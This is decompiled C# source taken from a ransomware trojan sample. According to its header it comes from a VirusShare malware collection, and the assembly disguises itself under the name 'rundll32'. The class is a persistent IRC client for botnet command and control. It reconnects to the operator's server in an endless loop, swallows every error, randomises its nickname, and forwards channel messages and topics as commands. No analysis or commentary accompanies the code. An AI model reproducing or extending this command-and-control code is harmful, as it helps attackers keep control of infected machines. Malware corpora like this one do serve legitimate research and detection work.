// Decompiled with JetBrains decompiler
// Type: rundll32.irc
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace rundll32
{
  public class irc
  {
    private Thread thisThread;
    private TcpClient tcpClient;
    private StreamWriter streamWriter;
    private StreamReader streamReader;
    private string _nick;
    private string _user;
    private ircConnectionDetails _connectionDetails;

    public event irc.onConnectionDelegate onConnection;

    public event irc.onMessageReceivedDelegate onMessageReceived;

    public string nick
    {
      get => this._nick;
      set
      {
        this._nick = value;
        this.sendNick(value);
      }
    }

    public string user => this._user;

    public ircConnectionDetails connectionDetails => this._connectionDetails;

    public irc(ircConnectionDetails connectionDetails, ircUser userDetails)
    {
      this._connectionDetails = connectionDetails;
      this._nick = userDetails.nick;
      this._user = userDetails.user;
    }

    public void Stop()
    {
      try
      {
        this.tcpClient.Close();
      }
      catch
      {
      }
      try
      {
        this.thisThread.Abort();
      }
      catch
      {
      }
    }

    public void connect()
    {
      this.Stop();
      this.thisThread = new Thread(new ThreadStart(this.connectThreadLoop));
      this.thisThread.Start();
    }

    private void connectThreadLoop()
    {
      while (true)
      {
        try
        {
          this.tcpClient = new TcpClient();
          this.tcpClient.Connect(this.connectionDetails.host, this.connectionDetails.port);
          this.streamReader = new StreamReader((Stream) this.tcpClient.GetStream());
          this.streamWriter = new StreamWriter((Stream) this.tcpClient.GetStream());
          this.streamWriter.AutoFlush = true;
          if (config.pass != null)
            this.sendPass(config.pass);
          this.sendUser(this.user);
          this.sendNick(this.nick);
          this.startHandling();
        }
        catch
        {
        }
      }
    }

    private void startHandling()
    {
      try
      {
        while (this.tcpClient.Connected)
        {
          string str1 = this.streamReader.ReadLine();
          Console.WriteLine("in: " + str1);
          if (str1 == null)
            throw new Exception("Reconnect");
          try
          {
            string[] strArray = str1.Split(' ');
            if (strArray[0] == "PING")
            {
              this.sendPong(strArray[1].Substring(1));
            }
            else
            {
              switch (strArray[1].ToUpper())
              {
                case "PRIVMSG":
                  string nick = strArray[0].Substring(0, strArray[0].IndexOf("!")).Substring(1);
                  string user = strArray[0].Substring(strArray[0].IndexOf("!") + 1, strArray[0].IndexOf("@") - (strArray[0].IndexOf("!") + 1));
                  string host = strArray[0].Substring(strArray[0].IndexOf("@") + 1);
                  string channel = strArray[2];
                  string str2 = str1.Substring(1);
                  string message = str2.Substring(str2.IndexOf(":") + 1);
                  this.onMessageReceived(this, new ircMessage(new ircUser(this, nick, user, host), message, channel));
                  continue;
                case "TOPIC":
                  string str3 = str1.Substring(1);
                  this.onMessageReceived(this, new ircMessage(new ircUser((irc) null, "127.0.0.1", "Topic", "Topic"), str3.Substring(str3.IndexOf(":") + 1), strArray[2]));
                  continue;
                case "001":
                  this.onConnection(this);
                  continue;
                case "999":
                  this.onConnection(this);
                  continue;
                case "433":
                  string newValue = new Random().Next(10000, 99999).ToString();
                  this._nick = config.nick.Replace("%rand%", newValue);
                  this._user = config.user.Replace("%rand%", newValue);
                  this.tcpClient.Close();
                  continue;
                case "332":
                  string str4 = str1.Substring(1);
                  this.onMessageReceived(this, new ircMessage(new ircUser((irc) null, "127.0.0.1", "Topic", "Topic"), str4.Substring(str4.IndexOf(":") + 1), strArray[3]));
                  continue;
                default:
                  continue;
              }
            }
          }
          catch
          {
          }
        }
      }
      catch
      {
        Thread.Sleep(5000);
        this.connect();
      }
    }

    public void send(string data)
    {
      try
      {
        Console.WriteLine("out: " + data);
        this.streamWriter.WriteLine(data);
      }
      catch
      {
      }
    }

    private void sendPass(string pass) => this.send("PASS " + pass);

    public void sendUser(string user) => this.send("USER bot 0 * : " + user);

    public void sendNick(string nick) => this.send("NICK " + nick);

    public void sendJoin(string channel) => this.send("JOIN " + channel);

    public void sendJoin(string channel, string key) => this.send("JOIN " + channel + " " + key);

    public void sendPart(string channel) => this.send("PART " + channel);

    public void sendPong(string data) => this.send("PONG " + data);

    public void sendMessage(string channel, string message) => this.send("PRIVMSG " + channel + " :\u000314" + message);

    public void sendNotice(string user, string message) => this.send("NOTICE " + user + " :\u000314" + message);

    public void sendQuit() => this.send("QUIT");

    public void sendQuit(string reason) => this.send("QUIT " + reason);

    public delegate void onConnectionDelegate(irc irc);

    public delegate void onMessageReceivedDelegate(irc irc, ircMessage message);
  }
}
